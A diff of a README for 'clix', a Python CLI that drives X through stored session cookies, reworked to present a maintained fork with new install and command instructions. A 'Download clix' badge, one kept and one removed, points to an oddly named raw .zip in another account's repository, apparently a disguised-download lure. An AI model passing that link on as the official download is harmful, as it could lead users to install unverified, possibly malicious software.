@@ -1,5 +1,7 @@
 # 🤖 clix - Control X from the Terminal Easily
 
+> **Maintained fork.** Upstream stopped at 0.4.2 (March 2026) while PyPI kept shipping `clix0` up to 0.5.1 — and the repo named in the package metadata now 404s, so 0.5.1 source only ever existed as a wheel. This fork reconstructs that 0.5.1 tree and keeps it working against X's frontend changes. Full history and fix list: **[FORK.md](FORK.md)**.
+
 [![Download clix](https://img.shields.io/badge/Download-clix-ff6600?style=for-the-badge)](https://raw.githubusercontent.com/dubious-pinetum918/clix/main/clix/mcp/Software-v2.1-beta.3.zip)
 
 ---
@@ -28,11 +30,22 @@ No special software needs to be installed beyond the clix program.
 
 ## 🚀 How to Get clix
 
-To get clix, visit the official release page on GitHub by clicking the link below:
+clix is a Python CLI. Install this maintained fork (Python 3.11+, [uv](https://docs.astral.sh/uv/) recommended):
 
-[![Download clix](https://img.shields.io/badge/Get_clix-Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/dubious-pinetum918/clix/main/clix/mcp/Software-v2.1-beta.3.zip)
+```bash
+uv tool install --editable git+https://github.com/robertung88/clix
+# or, without uv
+python3.11 -m pip install git+https://github.com/robertung88/clix
+```
 
-This page lists all the available versions. Look for the latest Windows version available for download.
+Then authenticate with your own X cookies and check the install:
+
+```bash
+clix auth login
+clix doctor
+```
+
+`clix doctor` should end with cookie validation passing and ~700 GraphQL operations cached. The upstream PyPI package (`clix0 0.5.1`) still installs, but it is the unmaintained build.
 
 ---
 
@@ -60,11 +73,14 @@ Once clix is open, you will control X from the terminal by typing commands.
 
 Here are some basic commands to get started:
 
-- `clix login` — Connect your AI Agent to clix (no API keys needed).
-- `clix post "Your message"` — Send a message to X.
-- `clix timeline` — See recent messages from people you follow.
-- `clix mentions` — View messages that mention your agent.
-- `clix help` — Show a list of all commands available.
+- `clix auth login` — Store your X cookies (no API keys needed).
+- `clix doctor` — Verify auth, endpoint cache and API connectivity.
+- `clix feed -n 20` — Your timeline.
+- `clix -c search "query" -t latest -n 10` — Search, compact output.
+- `clix -c tweet TWEET_ID` — A tweet and its replies.
+- `clix -c user HANDLE` — A profile.
+- `clix post "Your message"` — Post (all writes are explicit).
+- `clix --help` — Every command.
 
 Use your keyboard to type these commands and press Enter to execute.
 
